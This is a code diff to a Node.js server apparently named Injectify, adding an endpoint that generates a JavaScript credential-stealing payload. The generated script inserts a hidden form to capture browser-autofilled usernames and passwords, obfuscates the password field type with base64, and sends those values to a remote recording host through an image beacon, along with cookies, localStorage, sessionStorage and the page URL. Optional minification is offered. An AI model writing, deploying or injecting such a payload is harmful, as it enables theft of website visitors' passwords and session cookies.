@@ -20,6 +20,10 @@ const path 			= require('path')
 const request 		= require('request')
 const {URL}			= require('url')
 const chalk 		= require('chalk')
+const atob			= require('atob')
+const btoa			= require('btoa')
+const beautify		= require('js-beautify').js_beautify
+const UglifyJS		= require("uglify-js")
 
 console.log(chalk.greenBright("[Injectify] ") + "listening on port " + config.express)
 
@@ -676,6 +680,100 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				message: "Specify a token & project name to return in request",
 				format: "https://injectify.samdd.me/api/GITHUB_TOKEN/PROJECT_NAME"
 			}, null, "\t"))
+		}
+	})
+
+	app.get('/payload/*', (req, res) => {
+		let valid = true
+		if (!req.query.project) valid = false
+
+		let screenSize		= true
+		if (req.query.screenSize == "false") screenSize = false
+		let location		= true
+		if (req.query.location == "false") location = false
+		let localStorage	= true
+		if (req.query.localStorage == "false") localStorage = false
+		let sessionStorage	= true
+		if (req.query.sessionStorage == "false") sessionStorage = false
+		let cookies			= true
+		if (req.query.cookies == "false") cookies = false
+		
+		let proxy			= "//injectify.samdd.me/record/"
+		if (req.query.proxy) proxy = req.query.proxy
+		if (valid) {
+			res.setHeader('Content-Type', 'application/javascript')
+
+			let json		= '',
+				variables	= ''
+
+			if (screenSize) {
+				variables	+= 'j = k.screen, a = k.devicePixelRatio,'
+				json		+= 'e: j.height * a, f: j.width * a,'
+			}
+			if (location)	json += 'd: k.location.href,'
+			if (localStorage)	json += 'g: localStorage,'
+			if (sessionStorage)	json += 'h: sessionStorage,'
+			if (cookies)		json += 'i: d.cookie,'
+
+			if (variables)	variables 	= ',' + variables.slice(0, -1)
+			if (json) 		json 		= ',' + json.slice(0, -1)
+
+			let script = `
+/***************************\\
+ Injectify payload generator
+ ---------------------------
+ GET_PARAM              TYPE
+ ---------------------------
+ project              STRING
+ proxy                   URL
+ screenSize          BOOLEAN
+ location            BOOLEAN
+ localStorage        BOOLEAN
+ sessionStorage      BOOLEAN
+ cookies             BOOLEAN
+ ---------------------------
+ compress            BOOLEAN
+\\***************************/
+
+var d = document,
+	v = "input",
+	w = d.createElement("form"),
+	x = d.createElement(v),
+	r = new Image(),
+	k = window` + variables + `
+x.name = ""
+x.style = "display:none"  
+
+var y = x.cloneNode()
+y.type = atob("cGFzc3dvcmQ=")
+
+w.appendChild(x)
+w.appendChild(y)
+d.body.appendChild(w)
+
+y.addEventListener(v, function () {
+	var i = {
+		a: atob("` + btoa(req.query.project) + `"),
+		b: x.value,
+		c: y.value` + json + `
+	}
+	r.src = atob("` + btoa(proxy) + `") + btoa(JSON.stringify(i))
+	w.remove()
+})
+			`
+			if (req.query.compress == "true") {
+				res.send(
+					UglifyJS.minify(script).code
+				)
+			} else {
+				res.send(
+					beautify(script, {
+						indent_size: 2
+					})
+				)
+			}
+		} else {
+			res.send('invalid')
 		}
 	})
 
